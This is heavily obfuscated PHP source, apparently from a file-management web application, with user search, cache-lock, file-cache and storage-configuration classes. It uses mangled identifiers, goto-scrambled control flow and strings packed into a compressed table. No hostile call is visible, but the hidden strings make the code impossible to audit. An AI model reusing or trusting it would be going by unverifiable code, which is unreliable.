$€±öÃ°[$í€ı¾¬Ì]; $Çà÷éï = $Çà÷éï . "\165\163\145\162\56{$Øø‘ğ­Ç}\40{$í€ı¾¬Ì}\54\x20\x75\x73\x65\162\56\x75\163\145\x72\111\104\x20\141\x73\143"; return $this->alias($ûü™ËŠ­[2074])->order($Çà÷éï); } public function listSearch($¨êÇ¾²®) { $ÁÕå’ÑÖ =& $_SERVER[ªÏ§Ë·]; $¶©ö×İ = $¨êÇ¾²®[$ÁÕå’ÑÖ[1951]]; $ ÂßÖùñ = isset($¨êÇ¾²®[$ÁÕå’ÑÖ[1952]]) ? $¨êÇ¾²®[$ÁÕå’ÑÖ[1952]] : !1; $¶©ö×İ = str_replace($ÁÕå’ÑÖ[1953], $ÁÕå’ÑÖ[1954], trim($¶©ö×İ)); $µ’«àÅ = array($ÁÕå’ÑÖ[42] => array($ÁÕå’ÑÖ[421], "\x25{$¶©ö×İ}\x25"), $ÁÕå’ÑÖ[343] => array($ÁÕå’ÑÖ[421], "{$¶©ö×İ}\x25"), $ÁÕå’ÑÖ[570] => array($ÁÕå’ÑÖ[421], "{$¶©ö×İ}\x25"), $ÁÕå’ÑÖ[1025] => $ÁÕå’ÑÖ[1955]); if (Input::check($¶©ö×İ, $ÁÕå’ÑÖ[349])) { $µ’«àÅ[$ÁÕå’ÑÖ[1667]] = array($ÁÕå’ÑÖ[421], "{$¶©ö×İ}\x25"); $µ’«àÅ[$ÁÕå’ÑÖ[2325]] = array($ÁÕå’ÑÖ[421], "{$¶©ö×İ}\x25"); } if (!$¶©ö×İ) { $µ’«àÅ = array(); } if (isset($¨êÇ¾²®[$ÁÕå’ÑÖ[778]])) { $µ’«àÅ[$ÁÕå’ÑÖ[778]] = $¨êÇ¾²®[$ÁÕå’ÑÖ[778]]; } $µ’«àÅ = $this->parseWhereLike($µ’«àÅ); $ß½§û÷• = $this->_makeOrder()->where($µ’«àÅ)->selectPage(20); if (!$ß½§û÷• || count($ß½§û÷•[$ÁÕå’ÑÖ[407]]) < 5 && Input::check($¶©ö×İ, $ÁÕå’ÑÖ[356])) { $¹š‰ÑĞ = $this->_searchFromMeta($ÁÕå’ÑÖ[502], $¶©ö×İ, 10); $µ™¸²ê˜ = $this->_searchFromMeta($ÁÕå’ÑÖ[503], $¶©ö×İ, 10); $µŒÜ²½ = array_merge($¹š‰ÑĞ, $µ™¸²ê˜, $ß½§û÷•[$ÁÕå’ÑÖ[407]]); $ß½§û÷•[$ÁÕå’ÑÖ[407]] = array_unique_by_key($µŒÜ²½, $ÁÕå’ÑÖ[1667]); $ß½§û÷•[$ÁÕå’ÑÖ[404]][$ÁÕå’ÑÖ[405]] = count($ß½§û÷•[$ÁÕå’ÑÖ[407]]); $ß½§û÷•[$ÁÕå’ÑÖ[404]][$ÁÕå’ÑÖ[406]] = ceil($ß½§û÷•[$ÁÕå’ÑÖ[404]][$ÁÕå’ÑÖ[405]] / $ß½§û÷•[$ÁÕå’ÑÖ[404]][$ÁÕå’ÑÖ[401]]); } $this->_listDataApply($ß½§û÷•[$ÁÕå’ÑÖ[407]]); $this->_filterByGroup($ß½§û÷•, $ ÂßÖùñ); return $ß½§û÷•; } private function _filterByGroup(&$‰¶¿ĞË, $¸Â„ëÜˆ) { $­–òÌÓÁ =& $_SERVER[ªÏ§Ë·]; if (!$¸Â„ëÜˆ) { return $‰¶¿ĞË; } foreach ($‰¶¿ĞË[$­–òÌÓÁ[407]] as $Î…¯ôÒË => &$­‘á‘ğş) { $òó—¥¿Ë = array_to_keyvalue($­‘á‘ğş[$­–òÌÓÁ[2044]], $­–òÌÓÁ[12], $­–òÌÓÁ[1857]); if (!in_array($¸Â„ëÜˆ, $òó—¥¿Ë)) { unset($‰¶¿ĞË[$­–òÌÓÁ[407]][$Î…¯ôÒË]); } } unset($­‘á‘ğş); $‰¶¿ĞË[$­–òÌÓÁ[407]] = array_values($‰¶¿ĞË[$­–òÌÓÁ[407]]); $‰¶¿ĞË[$­–òÌÓÁ[404]] = array($­–òÌÓÁ[2109] => count($‰¶¿ĞË[$­–òÌÓÁ[407]]), $­–òÌÓÁ[2107] => $‰¶¿ĞË[$­–òÌÓÁ[404]][$­–òÌÓÁ[401]], $­–òÌÓÁ[2106] => 1, $­–òÌÓÁ[2108] => 1); } private function _searchFromMeta($³Ã‘Ÿï, $Æğ™ÒöØ, $Îª¨ÕŒ©) { $£¨¿ˆšß =& $_SERVER[ªÏ§Ë·]; $Æğ™ÒöØ = strtolower($Æğ™ÒöØ); $Èº³îè = array($£¨¿ˆšß[104] => $³Ã‘Ÿï, $£¨¿ˆšß[412] => array($£¨¿ˆšß[421], "\45{$Æğ™ÒöØ}\x25")); $Èº³îè = $this->parseWhereLike($Èº³îè); $÷òåû©Ô = Model($£¨¿ˆšß[2344])->where($Èº³îè)->limit($Îª¨ÕŒ©)->select(); if (!$÷òåû©Ô) { return array(); } $÷òåû©Ô = array_to_keyvalue($÷òåû©Ô, $£¨¿ˆšß[12], $£¨¿ˆšß[1667]); $úÏÕ„À› = $this->where(array($£¨¿ˆšß[1658] => array($£¨¿ˆšß[7], $÷òåû©Ô)))->select(); if (!$úÏÕ„À›) { return array(); } return $úÏÕ„À›; } private function _listDataApplyItem($âÕ‹Ü‡ñ) { $†Èğ÷Óš = array($âÕ‹Ü‡ñ); $this->_listDataApply($†Èğ÷Óš); return $†Èğ÷Óš[0]; } private function _listDataApply(&$¾öƒ‘öË) { $‡÷­†üö =& $_SERVER[ªÏ§Ë·]; if (!$¾öƒ‘öË) { return; } array_remove_key($¾öƒ‘öË, $‡÷­†üö[914]); $äÇÔ ßõ = array_to_keyvalue($¾öƒ‘öË, $‡÷­†üö[12], $‡÷­†üö[1667]); $this->_listAppendGroup($¾öƒ‘öË, $äÇÔ ßõ); $this->_listAppendMeta($¾öƒ‘öË, $äÇÔ ßõ); $this->_listAppendSourceRoot($¾öƒ‘öË, $äÇÔ ßõ); } private function _listAppendSourceRoot(&$õŞÉÇÃä, $´ãÉ¦) { $øõœÎÑç =& $_SERVER[ªÏ§Ë·]; $¥¦¬€«  = Model($øõœÎÑç[853])->listSourceRoot(SourceModel::TYPE_USER, $´ãÉ¦); $¥¦¬€«  = array_to_keyvalue($¥¦¬€« , $øõœÎÑç[534]); $¥¦¬€«  = array_remove_key($¥¦¬€« , $øõœÎÑç[534]); foreach ($õŞÉÇÃä as &$º€ĞŸ¤¹) { $º€ĞŸ¤¹[$øõœÎÑç[97]] = $¥¦¬€« [$º€ĞŸ¤¹[$øõœÎÑç[1667]]] ? $¥¦¬€« [$º€ĞŸ¤¹[$øõœÎÑç[1667]]] : array(); } unset($º€ĞŸ¤¹); } private function _listAppendGroup(&$Û€ÄÌ×ò, $Í¨ÓìÄû) { $²ú‰Øôó =& $_SERVER[ªÏ§Ë·]; $äøëäö® = array($²ú‰Øôó[1667] => array($²ú‰Øôó[7], $Í¨ÓìÄû)); $ø×Ûé°Í = Model($²ú‰Øôó[1947])->where($äøëäö®)->select(); $›‚ØµàŸ = array_to_keyvalue($ø×Ûé°Í, $²ú‰Øôó[12], $²ú‰Øôó[1857]); $›‚ØµàŸ = array_remove_value(array_unique($›‚ØµàŸ), $²ú‰Øôó[208]); if (!$›‚ØµàŸ || !$ø×Ûé°Í) { return; } $äøëäö® = array($²ú‰Øôó[1857] => array($²ú‰Øôó[7], $›‚ØµàŸ)); $ş†Íš¿ä = Model($²ú‰Øôó[2042])->field($²ú‰Øôó[2345])->where($äøëäö®)->select(); $ş†Íš¿ä = array_to_keyvalue($ş†Íš¿ä, $²ú‰Øôó[1857]); $ø×Ûé°Í = array_to_keyvalue_group($ø×Ûé°Í, $²ú‰Øôó[1667]); foreach ($ø×Ûé°Í as &$ÊìúÜ‚) { $ôïš´„× = array(); foreach ($ÊìúÜ‚ as $Ù Ëé÷Ü) { if (!$Ù Ëé÷Ü[$²ú‰Øôó[1961]]) { continue; } $ÂÆó“¦æ = Model($²ú‰Øôó[536])->listData($Ù Ëé÷Ü[$²ú‰Øôó[1961]]); $ôïš´„×[] = array($²ú‰Øôó[1857] => $Ù Ëé÷Ü[$²ú‰Øôó[1857]], $²ú‰Øôó[2346] => $ş†Íš¿ä[$Ù Ëé÷Ü[$²ú‰Øôó[1857]]][$²ú‰Øôó[42]], $²ú‰Øôó[549] => $ş†Íš¿ä[$Ù Ëé÷Ü[$²ú‰Øôó[1857]]][$²ú‰Øôó[549]], $²ú‰Øôó[451] => $ÂÆó“¦æ); } $ÊìúÜ‚ = $ôïš´„×; } unset($ÊìúÜ‚); foreach ($Û€ÄÌ×ò as &$Ôõ´Àİ×) { $Ôõ´Àİ×[$²ú‰Øôó[2044]] = array(); if (isset($ø×Ûé°Í[$Ôõ´Àİ×[$²ú‰Øôó[1667]]])) { $Ôõ´Àİ×[$²ú‰Øôó[2044]] = $ø×Ûé°Í[$Ôõ´Àİ×[$²ú‰Øôó[1667]]]; } } unset($Ôõ´Àİ×); } public function userAppendGroup($¹Á§‰®Ñ) { $ŠÁéÛñğ =& $_SERVER[ªÏ§Ë·]; if (!$¹Á§‰®Ñ) { return array(); } $this->_listAppendGroup($¹Á§‰®Ñ, array_to_keyvalue($¹Á§‰®Ñ, $ŠÁéÛñğ[12], $ŠÁéÛñğ[1667])); return $¹Á§‰®Ñ; } private function _listAppendMeta(&$úìİÕ‹¯, $Ş»””›) { $¯ÜÆõ¿¬ =& $_SERVER[ªÏ§Ë·]; $ã•£òí£ = UserJobModel::JOB_KEY; $÷ˆüŸšƒ = array($¯ÜÆõ¿¬[2326]); $Ğ´£“ø = array($¯ÜÆõ¿¬[1667] => array($¯ÜÆõ¿¬[7], $Ş»””›)); $ı½şĞãÃ = Model($¯ÜÆõ¿¬[2324])->where($Ğ´£“ø)->select(); $ı½şĞãÃ = array_to_keyvalue_group($ı½şĞãÃ, $¯ÜÆõ¿¬[1667]); foreach ($ı½şĞãÃ as &$èÉÒ¼£Ï) { $á«‘«€ = array(); foreach ($èÉÒ¼£Ï as $ˆú”ÙµÌ) { if (!in_array($ˆú”ÙµÌ[$¯ÜÆõ¿¬[104]], $÷ˆüŸšƒ)) { $á«‘«€[$ˆú”ÙµÌ[$¯ÜÆõ¿¬[104]]] = $ˆú”ÙµÌ[$¯ÜÆõ¿¬[412]]; } } $èÉÒ¼£Ï = $á«‘«€; } unset($èÉÒ¼£Ï); $Òô´¿–Ï = Model($¯ÜÆõ¿¬[2347]); foreach ($úìİÕ‹¯ as &$¹†şÒµÛ) { $·ÌòÑ¸¦ = array(); if (isset($ı½şĞãÃ[$¹†şÒµÛ[$¯ÜÆõ¿¬[1667]]])) { $·ÌòÑ¸¦ = $ı½şĞãÃ[$¹†şÒµÛ[$¯ÜÆõ¿¬[1667]]]; } $¹†şÒµÛ[$¯ÜÆõ¿¬[2348]] = array(); if (isset($·ÌòÑ¸¦[$ã•£òí£])) { $¹†şÒµÛ[$¯ÜÆõ¿¬[2348]] = $Òô´¿–Ï->getUserJobInfo($·ÌòÑ¸¦[$ã•£òí£]); } } unset($¹†şÒµÛ); } protected function groupUserAll($ƒšÔ¡°â) { $ÍÄ™ğÂÊ =& $_SERVER[ªÏ§Ë·]; if (!$ƒšÔ¡°â) { return !1; } $ñìøİÕš = Model($ÍÄ™ğÂÊ[1947])->field($ÍÄ™ğÂÊ[1667])->where(array($ÍÄ™ğÂÊ[1857] => array($ÍÄ™ğÂÊ[7], $ƒšÔ¡°â)))->select(); $ñìøİÕš = array_to_keyvalue($ñìøİÕš, $ÍÄ™ğÂÊ[12], $ÍÄ™ğÂÊ[1667]); return array_unique($ñìøİÕš); } public function userSearch($Ÿ¿ËÍÍ, $½î‡±Øú = "\x2a") { return Model($_SERVER[ªÏ§Ë·][563])->where($Ÿ¿ËÍÍ)->field($½î‡±Øú)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\162\137\x6f\x70\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Ò¸†êÙó) { $²Áö£ëŞ =& $_SERVER[ªÏ§Ë·]; $‹óßÁÚĞ = defined($²Áö£ëŞ[2078]) && USER_ID ? USER_ID : $²Áö£ëŞ[12]; return "\x55\x73\145\162\117\160\x74\x69\157\156\x5f{$Ò¸†êÙó}\137" . $‹óßÁÚĞ; } protected function filterWhere($¯»×ÆÀŒ) { $Àâá†É„ =& $_SERVER[ªÏ§Ë·]; $¯»×ÆÀŒ[$Àâá†É„[1667]] = defined($Àâá†É„[2078]) && USER_ID ? USER_ID : $Àâá†É„[12]; return $¯»×ÆÀŒ; } public function cacheRemoveUser($°à†››, $ÌŞí¾Ä¹) { return Cache::remove("\x55\163\145\162\117\160\x74\151\x6f\156\x5f{$°à†››}\x5f" . $ÌŞí¾Ä¹); } protected function optionDefault($½Š²Ã’ = '') { $Ì¨œ„œ =& $_SERVER[ªÏ§Ë·]; if ($½Š²Ã’ == $Ì¨œ„œ[12]) { return $GLOBALS[$Ì¨œ„œ[6]][$Ì¨œ„œ[2349]]; } if ($½Š²Ã’ == $Ì¨œ„œ[2350]) { return $GLOBALS[$Ì¨œ„œ[6]][$Ì¨œ„œ[2351]]; } } } goto DÔ¬‚öƒØ; b…ö¤±…¹ñ: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Œˆ”éİ, $ü¶×›åı) { $Ó½çÍÃ‰ =& $_SERVER[ªÏ§Ë·]; $this->cachePath = $Œˆ”éİ[$Ó½çÍÃ‰[94]]; $this->prefix = $Ó½çÍÃ‰[862]; $this->cacheTime = $ü¶×›åı; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($×ÛêçÛ) { $Î¢À÷¦  =& $_SERVER[ªÏ§Ë·]; $×ÛêçÛ = str_replace(array($Î¢À÷¦ [863], $Î¢À÷¦ [107], $Î¢À÷¦ [83]), $Î¢À÷¦ [864], $×ÛêçÛ); return $this->cachePath . $Î¢À÷¦ [865] . $×ÛêçÛ . $Î¢À÷¦ [866]; } public function set($âïÈÏíé, $¸Ê£ı, $ĞóóøŸÈ = false) { $ĞóóøŸÈ = $ĞóóøŸÈ ? $ĞóóøŸÈ : $this->cacheTime; $ÙêÑû‘„ = $this->getFile($âïÈÏíé); if (file_put_contents($ÙêÑû‘„, $this->prefix . $¸Ê£ı, LOCK_EX)) { @touch($ÙêÑû‘„, intval(time() + $ĞóóøŸÈ)); clearstatcache(); return !0; } @unlink($ÙêÑû‘„); return !1; } public function get($Ò˜÷ˆ‘ì) { $ ©œ”î = $this->getFile($Ò˜÷ˆ‘ì); if (file_exists($ ©œ”î) && filemtime($ ©œ”î) < time()) { @unlink($ ©œ”î); return !1; } $±íĞ£©° = @file_get_contents($ ©œ”î); return substr($±íĞ£©°, strlen($this->prefix)); } public function remove($ªù…òŒµ) { $Øšã˜ªç = $this->getFile($ªù…òŒµ); return @unlink($Øšã˜ªç); } public function deleteAll() { $÷±ú©öÙ =& $_SERVER[ªÏ§Ë·]; $çÛßÚÂ = scandir($this->cachePath); foreach ($çÛßÚÂ as $†¥‡ŸèÚ) { $¦½„×ÜĞ = $this->cachePath . $†¥‡ŸèÚ; if (strpos($¦½„×ÜĞ, $÷±ú©öÙ[866]) && strpos($¦½„×ÜĞ, $÷±ú©öÙ[867])) { @unlink($¦½„×ÜĞ); } } } public function clearTimeout() { $ëâ…Ùû² =& $_SERVER[ªÏ§Ë·]; $ê‹¼Ó = scandir($this->cachePath); foreach ($ê‹¼Ó as $ÌÈáĞ‹Ç) { $è³ÉÀë§ = $this->cachePath . $ÌÈáĞ‹Ç; if (strpos($è³ÉÀë§, $ëâ…Ùû²[866]) && strpos($è³ÉÀë§, $ëâ…Ùû²[867]) && filemtime($è³ÉÀë§) < time()) { @unlink($è³ÉÀë§); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Ó’¯¨ı =& $_SERVER[ªÏ§Ë·]; if (self::$handle) { return self::$handle; } $˜±ó¿¹É = $GLOBALS[$Ó’¯¨ı[6]][$Ó’¯¨ı[387]]; self::$timeout = $˜±ó¿¹É[$Ó’¯¨ı[868]] ? $˜±ó¿¹É[$Ó’¯¨ı[868]] : 10; $ê¤‘ïİï = _get($GLOBALS[$Ó’¯¨ı[6]], $Ó’¯¨ı[869]); $öõƒ¢½µ = $˜±ó¿¹É[$Ó’¯¨ı[855]] ? $˜±ó¿¹É[$Ó’¯¨ı[855]] : $Ó’¯¨ı[210]; if ($öõƒ¢½µ == $Ó’¯¨ı[31] && $ê¤‘ïİï == $Ó’¯¨ı[23]) { $öõƒ¢½µ = $Ó’¯¨ı[210]; } switch ($öõƒ¢½µ) { case $Ó’¯¨ı[858]: self::$handle = new CacheLockRedis(); break; case $Ó’¯¨ı[859]: self::$handle = new CacheLockMemcached(); break; case $Ó’¯¨ı[31]: self::$handle = new CacheLockDatabase(); break; case $Ó’¯¨ı[210]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ó’¯¨ı[870], $Ó’¯¨ı[871]); } return self::$handle; } private static function key($îÓâß„Ó) { return $_SERVER[ªÏ§Ë·][872] . Cache::key($îÓâß„Ó); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Şüå©¥„ = '') { self::$errorMsg = $Şüå©¥„; } public static function lockGlobal($ó¢²óƒì, $ş´ÒŞ©ñ) { return self::lock($ó¢²óƒì, $ş´ÒŞ©ñ, !0); } public static function lock($€“÷õ†É, $ŠÅ¨Ì—­ = false, $…ï‘±ø¦ = false) { $›¿¹ş’Ë =& $_SERVER[ªÏ§Ë·]; $Š£“ÌËà = self::init(); $‰£û¶« = self::key($€“÷õ†É); $ŠÅ¨Ì—­ = $ŠÅ¨Ì—­ ? $ŠÅ¨Ì—­ : self::$timeout; $ñæ½²š‰ = timeFloat(); $Ä¢ëÔ—Š = $Š£“ÌËà->lock($‰£û¶«, $ŠÅ¨Ì—­); $–®ÄªÍ = timeFloat(); if (!$Ä¢ëÔ—Š) { $ ©·òô = "\154\157\143\x6b\x20\145\x72\162\157\x72\73\153\x65\x79\75{$€“÷õ†É}\x3b\164\151\155\x65\x3d{$ŠÅ¨Ì—­}\x3b" . self::$errorMsg . $›¿¹ş’Ë[81] . get_caller_msg(); $×îÅ•ó = LNG($›¿¹ş’Ë[873]) . "\50{$ŠÅ¨Ì—­}\x73\x29\x2e" . LNG($›¿¹ş’Ë[874]); $×îÅ•ó .= $›¿¹ş’Ë[875]; if (is_string(self::$errorMsg) && self::$errorMsg) { $×îÅ•ó = $×îÅ•ó . $›¿¹ş’Ë[876] . self::$errorMsg; } write_log($›¿¹ş’Ë[877] . sprintf($›¿¹ş’Ë[878], timeFloat() - $ñæ½²š‰) . $›¿¹ş’Ë[879] . $ ©·òô . $›¿¹ş’Ë[880] . error_get_last(), $›¿¹ş’Ë[871]); show_json($×îÅ•ó, !1); } if (!$…ï‘±ø¦) { self::$lockItem[$‰£û¶«] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $³Ø¤ã¹ = number_format(timeFloat() - $–®ÄªÍ, 3); write_log($›¿¹ş’Ë[881] . $€“÷õ†É . $›¿¹ş’Ë[882] . $³Ø¤ã¹, $›¿¹ş’Ë[871]); } return $Ä¢ëÔ—Š; } public static function lockGet($ä‘Ûó–) { $ş£ëÜìõ = self::key($ä‘Ûó–); if (self::$lockItem[$ş£ëÜìõ]) { return self::$lockItem[$ş£ëÜìõ]; } return self::init()->lockGet($ş£ëÜìõ); } public static function unlock($Ö Ë¾óş) { $¡è»¹­á =& $_SERVER[ªÏ§Ë·]; $Ñá¹à = self::key($Ö Ë¾óş); self::$lockItem[$Ñá¹à] = null; self::init()->unlock($Ñá¹à); if (GLOBAL_DEBUG_LOG_ALL) { write_log($¡è»¹­á[883] . $Ö Ë¾óş, $¡è»¹­á[871]); } return; } public static function unlockRuntime() { $Á¡˜¼º =& $_SERVER[ªÏ§Ë·]; $ÅŞ‡´ó = self::init(); $ôŠö¹¢ó = !1; foreach (self::$lockItem as $åí©¾Åé => $ÌˆÜå¡’) { if (!$ÌˆÜå¡’) { continue; } $ÅŞ‡´ó->unlock($åí©¾Åé); if (!$ôŠö¹¢ó) { $ôŠö¹¢ó = !0; write_log($Á¡˜¼º[884] . $åí©¾Åé . $Á¡˜¼º[81] . get_caller_msg(), $Á¡˜¼º[871]); continue; } write_log($Á¡˜¼º[884] . $åí©¾Åé, $Á¡˜¼º[871]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¯°¹¢Ê = number_format(timeFloat() - TIME_FLOAT, 3); write_log($Á¡˜¼º[885] . $¯°¹¢Ê . $Á¡˜¼º[886] . ACTION, $Á¡˜¼º[871]); } } public static function fileLock($Î¥ø¼å©) { $à–‚¶Á =& $_SERVER[ªÏ§Ë·]; if (!$GLOBALS[$à–‚¶Á[887]]) { $GLOBALS[$à–‚¶Á[887]] = array(); } $GLOBALS[$à–‚¶Á[887]][$Î¥ø¼å©] = !1; $ŸèÍÖÜ… = fopen(DATA_PATH . $Î¥ø¼å© . $à–‚¶Á[888], $à–‚¶Á[889]); if (!$ŸèÍÖÜ…) { return !1; } $GLOBALS[$à–‚¶Á[887]][$Î¥ø¼å©] = $ŸèÍÖÜ…; if (flock($ŸèÍÖÜ…, LOCK_EX)) { return !0; } self::unlock($Î¥ø¼å©); show_json($à–‚¶Á[890], !1); return !1; } public static function fileUnlock($ø’Û÷¨•) { $¯“ß²³€ =& $_SERVER[ªÏ§Ë·]; $ÔäÆÆ—ê = $GLOBALS[$¯“ß²³€[887]][$ø’Û÷¨•]; if (!$ÔäÆÆ—ê) { return; } $GLOBALS[$¯“ß²³€[887]][$ø’Û÷¨•] = !1; flock($ÔäÆÆ—ê, LOCK_UN); fclose($ÔäÆÆ—ê); } public static function fileUnlockAll() { $Ë–Í¥™« =& $_SERVER[ªÏ§Ë·]; if (!$GLOBALS[$Ë–Í¥™«[887]]) { return; } foreach ($GLOBALS[$Ë–Í¥™«[887]] as $ãıö¼îñ => $ÚóÄªÅ¢) { if (!$ÚóÄªÅ¢) { continue; } $GLOBALS[$Ë–Í¥™«[887]][$ãıö¼îñ] = !1; flock($ÚóÄªÅ¢, LOCK_UN); fclose($ÚóÄªÅ¢); } $GLOBALS[$Ë–Í¥™«[887]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto bğÄ­™‘œÍ; Bğ¶‹•ŒÙ: define($_SERVER[ªÏ§Ë·][0], $_SERVER[ªÏ§Ë·][1]); $_SERVER[ìè™õˆã] = explode($_SERVER[ªÏ§Ë·][2], gzinflate(substr($_SERVER[ªÏ§Ë·][3], 10, -8))); function binCheckEq($ã¨Ìß§Œ, $öË¸ûô) { return $ã¨Ìß§Œ == $öË¸ûô; } goto cñ‚ª‘œÉî; Eè¯¤ƒ‘„©: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\x2e\163\x74\x6f\x72\141\147\x65\114\151\163\x74"; public $field = array("\156\x61\155\145", "\x73\151\x7a\145\115\141\x78", "\163\x79\x73\x74\145\x6d", "\144\x65\x66\x61\165\x6c\164", "\144\x72\x69\x76\145\x72", "\143\157\156\x66\x69\147"); public function listData($»í¥´Õ© = false, $¤‡‰‚áÑ = "\x6d\x6f\x64\151\146\171\x54\x69\155\145", $º¦â§ññ = false) { $¯ÕĞ±èÜ =& $_SERVER[ªÏ§Ë·]; $™äÛõÔ = parent::listData($»í¥´Õ©, $¤‡‰‚áÑ, $º¦â§ññ); if ($»í¥´Õ©) { return $™äÛõÔ; } $¹Ñõã¾ = $this->ioSizeUseGet(array_to_keyvalue($™äÛõÔ, $¯ÕĞ±èÜ[12], $¯ÕĞ±èÜ[437])); foreach ($™äÛõÔ as $ÎÃŠ › => $’¯‚ÆØ) { unset($™äÛõÔ[$ÎÃŠ ›][$¯ÕĞ±èÜ[6]]); $™äÛõÔ[$ÎÃŠ ›][$¯ÕĞ±èÜ[1846]] = isset($¹Ñõã¾[$’¯‚ÆØ[$¯ÕĞ±èÜ[437]]]) ? $¹Ñõã¾[$’¯‚ÆØ[$¯ÕĞ±èÜ[437]]] : 0; } return $™äÛõÔ; } public function ioSizeUseGet($·ê Œøä) { $½˜÷ó¥¥ =& $_SERVER[ªÏ§Ë·]; if (!$·ê Œøä) { return array(); } $º°èãç = $½˜÷ó¥¥[2174] . implode($½˜÷ó¥¥[60], $·ê Œøä); $İêœÌŸÉ = Cache::get($º°èãç); if ($İêœÌŸÉ) { return $İêœÌŸÉ; } $ŞÌ´³úÖ = array($½˜÷ó¥¥[845] => $½˜÷ó¥¥[437], $½˜÷ó¥¥[2175] => $½˜÷ó¥¥[86]); $üùÎı = array($½˜÷ó¥¥[845] => array($½˜÷ó¥¥[7], $·ê Œøä)); $İêœÌŸÉ = Model($½˜÷ó¥¥[817])->field($ŞÌ´³úÖ)->where($üùÎı)->group($½˜÷ó¥¥[845])->select(); $İêœÌŸÉ = array_to_keyvalue($İêœÌŸÉ, $½˜÷ó¥¥[437], $½˜÷ó¥¥[86]); Cache::set($º°èãç, $İêœÌŸÉ, 600); return $İêœÌŸÉ; } public function getConfig($ÉÔ²´‹½) { $«ìº¨Æ· = parent::listData($ÉÔ²´‹½); return json_decode($«ìº¨Æ·[$_SERVER[ªÏ§Ë·][6]], !0); } public function update($íÕ¹Ş , $ÁÈâ–ñ) { $”Úé˜ =& $_SERVER[ªÏ§Ë·]; $¦£û„– = $ÁÈâ–ñ[$”Úé˜[42]]; $ø§ñÆ‘ı = array_to_keyvalue(parent::listData(), $”Úé˜[42]); if (isset($ø§ñÆ‘ı[$¦£û„–]) && $ø§ñÆ‘ı[$¦£û„–][$”Úé˜[437]] != $íÕ¹Ş ) { return !1; } $this->checkPwd($íÕ¹Ş , $ÁÈâ–ñ); if (isset($ÁÈâ–ñ[$”Úé˜[2176]]) && $ÁÈâ–ñ[$”Úé˜[2176]] == $”Úé˜[98]) { $this->checkConfig($ÁÈâ–ñ); } unset($ÁÈâ–ñ[$”Úé˜[2176]]); $—³òÏÃÙ = parent::update($íÕ¹Ş , $ÁÈâ–ñ); if ($—³òÏÃÙ && $ÁÈâ–ñ[$”Úé˜[47]]) { $øºí´»› = 0; foreach ($ø§ñÆ‘ı as $‰•è˜€Ÿ) { if ($‰•è˜€Ÿ[$”Úé˜[47]] && $‰•è˜€Ÿ[$”Úé˜[437]] != $íÕ¹Ş ) { $øºí´»› = $‰•è˜€Ÿ[$”Úé˜[437]]; parent::update($‰•è˜€Ÿ[$”Úé˜[437]], array($”Úé˜[47] => 0)); } } $this->updateBackup($íÕ¹Ş , $øºí´»›); } return $—³òÏÃÙ; } public function add($‡ö€ÃÜ) { $š­·òä =& $_SERVER[ªÏ§Ë·]; $É¥±İ½Â = array_to_keyvalue(parent::listData(), $š­·òä[42]); if (isset($É¥±İ½Â[$‡ö€ÃÜ[$š­·òä[42]]])) { return !1; } $this->checkConfig($‡ö€ÃÜ); $¿Øşß¢£ = parent::insert($‡ö€ÃÜ); if ($¿Øşß¢£ && $‡ö€ÃÜ[$š­·òä[47]]) { foreach ($É¥±İ½Â as $Ó•û¬ ú) { if ($Ó•û¬ ú[$š­·òä[47]]) { parent::update($Ó•û¬ ú[$š­·òä[437]], array($š­·òä[47] => 0)); } } } return $¿Øşß¢£; } public function updateBackup($İ”‡ ª÷, $±¢âŞµè) { $©Şè½È¹ =& $_SERVER[ªÏ§Ë·]; if (!$±¢âŞµè) { return; } $´áÅ½„ = Model($©Şè½È¹[777])->config(); if ($´áÅ½„[$©Şè½È¹[1637]] != $©Şè½È¹[98] || $´áÅ½„[$©Şè½È¹[779]] != $±¢âŞµè) { return; } $¢ê÷ôõ  = Model($©Şè½È¹[798])->get($©Şè½È¹[808]); $¢ê÷ôõ  = json_decode($¢ê÷ôõ , !0); if (!$¢ê÷ôõ ) { return; } $¢ê÷ôõ [$©Şè½È¹[779]] = $İ”‡ ª÷; Model($©Şè½È¹[798])->set(array($©Şè½È¹[808] => $¢ê÷ôõ )); } public function checkPwd($ï¿¢×, &$Ïö±«Ø‰) { $éƒîÊÛÕ =& $_SERVER[ªÏ§Ë·]; if (empty($Ïö±«Ø‰[$éƒîÊÛÕ[6]])) { return; } $é¢Æ€İ = json_decode($Ïö±«Ø‰[$éƒîÊÛÕ[6]], !0); $›Şœ‹¸Ê = $éƒîÊÛÕ[12]; $›¾ÛÊÒé = array($éƒîÊÛÕ[2177], $éƒîÊÛÕ[2178], $éƒîÊÛÕ[914]); foreach ($›¾ÛÊÒé as $ùùışõ”) { if (isset($é¢Æ€İ[$ùùışõ”])) { $›Şœ‹¸Ê = $ùùışõ”; break; } } if (!$›Şœ‹¸Ê) { return; } $×–¯ßûœ = $this->getConfig($ï¿¢×); $¡ŠŒ‰‹ = $×–¯ßûœ[$›Şœ‹¸Ê]; $¯‘ãŒ¢ = $é¢Æ€İ[$›Şœ‹¸Ê]; if ($¯‘ãŒ¢ == str_repeat($éƒîÊÛÕ[199], strlen($¡ŠŒ‰‹))) { $é¢Æ€İ[$›Şœ‹¸Ê] = $¡ŠŒ‰‹; $Ïö±«Ø‰[$éƒîÊÛÕ[6]] = json_encode($é¢Æ€İ); } else { if ($¯‘ãŒ¢ != $¡ŠŒ‰‹) { $Ïö±«Ø‰[$éƒîÊÛÕ[2176]] = $éƒîÊÛÕ[98]; } } } public function checkConfig(&$Á¿›Ù¼§, $÷‘à™»¹ = false) { $–Çœ¬åæ =& $_SERVER[ªÏ§Ë·]; $Çşè = strtolower($Á¿›Ù¼§[$–Çœ¬åæ[105]]); $«€×ƒåÃ = 